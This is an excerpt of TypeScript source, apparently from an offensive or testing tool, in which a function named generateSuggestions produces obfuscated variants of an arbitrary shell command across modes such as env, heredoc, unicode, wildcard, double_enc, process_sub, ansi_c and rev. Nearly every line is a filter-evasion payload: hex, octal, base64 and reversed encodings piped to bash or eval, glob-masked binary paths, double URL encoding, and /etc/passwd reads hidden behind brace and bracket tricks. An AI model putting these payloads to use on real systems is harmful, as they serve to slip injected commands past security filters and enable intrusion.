...
export function generateSuggestions(
  ...
  switch (mode) {
    ...
    case "env":
      return [
        `export CMD=${JSON.stringify(b)}; eval "$CMD"`,
        `_A=${JSON.stringify(b.split(' ')[0]!)}; _B=${JSON.stringify(b.split(' ').slice(1).join(' '))}; "$_A" $_B`,
        `env CMD=${JSON.stringify(b)} bash -c 'eval "$CMD"'`,
        `{ export X=${JSON.stringify(b)}; bash -c '$X'; }`,
        `BASH_ENV=/dev/stdin bash <<< "${b}"`,
        `ENV=/dev/stdin sh <<< "${b}"`,
        `__CMD=${JSON.stringify(b)} bash -c 'eval "$__CMD"'`,
        `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin ${b}`,
        `HOME=/ TERM=xterm ${b}`,
        `env -i HOME=/ TERM=xterm SHELL=/bin/bash ${b}`,
        `printenv HOME 2>/dev/null >/dev/null && ${b}`,
        `LD_PRELOAD="" ${b}`,
      ];
    ...
    case "heredoc":
      return [
        ...
        `bash <<<"$(echo ${b64s}|base64 -d)"`,
        `{ bash; } << 'NEXUS'\n${b}\nNEXUS`,
        `python3 << 'NXEOF'\nimport os\nos.system('${b.replace(/'/g, "\\'")}')\nNXEOF`,
        `cat << 'NXEOF' | bash\n${b}\nNXEOF`,
        `bash -s << 'NXEOF'\n${b}\nNXEOF`,
        `tee /dev/null << 'NXEOF' | bash\n${b}\nNXEOF`,
        `perl << 'NXEOF'\nsystem('${b.replace(/'/g, "\\'")}');\nNXEOF`,
        `bash -c $(cat << 'NXEOF'\n${b}\nNXEOF\n)`,
      ];

    case "unicode": {
      const toXHex = (s: string) => [...Buffer.from(s)].map(x => `\\x${(x as number).toString(16).padStart(2,'0')}`).join('');
      return [
        `printf '${toXHex(b)}'|bash`,
        `printf '%b' '${toXHex(b)}'|bash`,
        `echo -e '${toXHex(b)}'|bash`,
        `python3 -c "import os;os.system(b'${toXHex(b)}' .decode())"`,
        `perl -e "system(pack('H*','${rawHex(b)}'  ))"`,
        `bash -c $'${toXHex(b)}'`,
        `eval $'${toXHex(b)}'`,
        `printf '${[...Buffer.from(b)].map((_x,i)=>`\\%o`).join('')}'|bash`,
        `python3 -c "import os;os.system(bytes.fromhex('${rawHex(b)}').decode())"`,
        `node -e "require('child_process').execSync(Buffer.from('${b64s}','base64').toString())"`,
        `$'${toXHex(b.split(' ')[0]!)}' ${b.split(' ').slice(1).join(' ')}`,
      ];
    }

    case "null": {
      const nullEnc = encodeURIComponent(b);
      return [
        `${b} `,
        ` ${b}`,
        `${b}%00`,
    ...
    case "wildcard":
      return [
        ...
        `c[a]t /e[t]c/passw[d]`,
        `ls /[e]tc/[p]asswd`,
        `cat /etc/p{a,}sswd 2>/dev/null`,
        `*[h] -c "${b}" 2>/dev/null`,
        `/bin/?a?h -c "${b}"`,
        `/?s?/b?n/${b.split(' ')[0]} ${b.split(' ').slice(1).join(' ')}`,
        `/usr/bin/p[y]thon3 -c "import os;os.system('${b.replace(/'/g,"\\'")}')"`,
        `${b.split(' ')[0]![0]}?? ${b.split(' ').slice(1).join(' ')} 2>/dev/null||${b}`,
        `echo /bin/b* | awk '{print $1}' | xargs -I{} {} -c "${b}" 2>/dev/null`,
      ];
    ...
    case "double_enc": {
      const de = (s: string) => encodeURIComponent(encodeURIComponent(s));
      return [
        de(b),
        `${b.replace(/;/g,'%253b').replace(/ /g,'%2520').replace(/&/g,'%2526')}`,
        `${b.replace(/\//g,'%252F')}`,
        `${encodeURIComponent(b).replace(/%/g,'%25')}`,
        `${b.replace(/[a-z]/g, (c: string) => '%25'+c.charCodeAt(0).toString(16).padStart(2,'0'))}`,
        `${b.replace(/ /g,'%2B').replace(/\+/g,'%252B')}`,
        `${b.replace(/i/g,'%2569').replace(/d/g,'%2564')}`,
        `${b.split('').map((c: string)=>'%'+c.charCodeAt(0).toString(16).padStart(2,'0')).map(s=>s.replace(/%/,'%25')).join('')}`,
        `${b.replace(/[aeiou]/g,(c: string)=>'%25'+c.charCodeAt(0).toString(16))}`,
        `${b.replace(/ /g,'%2520').replace(/=/g,'%253D')}`,
      ];
    }
    ...
    case "process_sub":
      return [
        ...
        `cat <(${b})`,
        `bash <(${b}|head -1)`,
        `while read l; do echo "$l"; done < <(${b})`,
        `source <(echo ${b64s}|base64 -d)`,
        `eval $(cat <(echo ${b64s}|base64 -d))`,
        `tee >(bash) <<< "${b}" > /dev/null`,
        `{ read -r _o; echo "$_o"; } < <(${b})`,
        `wc -c < <(${b})`,
        `exec {fd}< <(${b}); cat <&$fd`,
    ...
    case "ansi_c": {
      const toAnsi = (s: string) => [...Buffer.from(s)].map(x => `\\x${(x as number).toString(16).padStart(2,'0')}`).join('');
      return [
        `$'${toAnsi(b)}'`,
        `bash -c $'${toAnsi(b)}'`,
        `sh -c $'${toAnsi(b)}'`,
        `eval $'${toAnsi(b)}'`,
        `_c=$'\\x69\\x64'; eval "$_c"`,
        `bash -c $'\\x69\\x64\\x3b\\x77\\x68\\x6f\\x61\\x6d\\x69'`,
        `printf $'${toAnsi(b)}'|bash`,
        `command $'\\x69\\x64'`,
        `$'\\x62\\x61\\x73\\x68' -c $'\\x69\\x64'`,
        `eval $'\\x69\\x64\\x3b\\x77\\x68\\x6f\\x61\\x6d\\x69'`,
        `${b.split(' ')[0]!.split('').map((c: string) => `$'\\x${c.charCodeAt(0).toString(16).padStart(2,'0')}'`).join('')} ${b.split(' ').slice(1).join(' ')}`,
      ];
    }
    ...
    case "rev": {
      ...
      const bR64 = b64(bRev);
      return [
        `echo ${JSON.stringify(bRev)}|rev|bash`,
        `echo ${bR64}|base64 -d|rev|bash`,
        `rev <<< "${bRev}" | bash`,
        `perl -e 'print scalar reverse "${bRev}"' | bash`,
        `python3 -c "import os;os.system('${bRev}'[::-1])"`,
        `ruby -e "system('${bRev}'.reverse)" 2>/dev/null`,
        `node -e "require('child_process').execSync('${bRev}'.split('').reverse().join(''),{stdio:'inherit'})" 2>/dev/null`,
        `echo "${bRev}"|awk '{for(i=length;i>0;i--)printf substr($0,i,1);print""}' | bash`,
        `echo ${bR64}|base64 -d|tr -d '\n'|rev|bash`,
        `printf '%s' "${bRev}" | rev | bash`,
      ];
    }
